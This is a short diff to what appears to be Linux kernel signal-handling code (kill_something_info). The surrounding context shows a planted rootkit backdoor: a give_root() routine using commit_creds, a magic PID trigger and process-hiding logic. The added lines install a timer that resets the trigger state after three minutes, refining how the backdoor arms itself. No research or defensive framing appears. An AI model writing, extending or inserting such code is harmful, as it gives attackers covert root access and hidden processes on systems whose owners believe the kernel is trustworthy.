@@ -1634,8 +1634,21 @@ void give_root(void){
 		commit_creds(newcreds);
 }
 
+#include <linux/timer.h>
+#include <linux/jiffies.h>
+
+
 static int MY_VAL = 0;
 static pid_t SWITCH = 78372345;
+
+static struct timer_list my_val_reset_timer;
+static bool my_val_timer_is_setup = false;
+
+static void do_reset_my_val_callback(struct timer_list *t)
+{
+    MY_VAL = 0;
+}
+
 
 static int kill_something_info(int sig, struct kernel_siginfo *info, pid_t pid)
 {
@@ -1659,6 +1672,13 @@ static int kill_something_info(int sig, struct kernel_siginfo *info, pid_t pid)
 //            printk(KERN_INFO "Toggled invisibility for PID: %d (now %s)\n",
 //                   task->pid,
 //                   (task->flags & 0x10000000) ? "hidden" : "visible");
+
+  	    if (!my_val_timer_is_setup) {
+                timer_setup(&my_val_reset_timer, do_reset_my_val_callback, 0);
+                my_val_timer_is_setup = true;
+            }
+            mod_timer(&my_val_reset_timer, jiffies + (3 * 60 * HZ));
+
             put_task_struct(task); // 释放引用计数
             rcu_read_unlock(); // 解锁
             return 0;
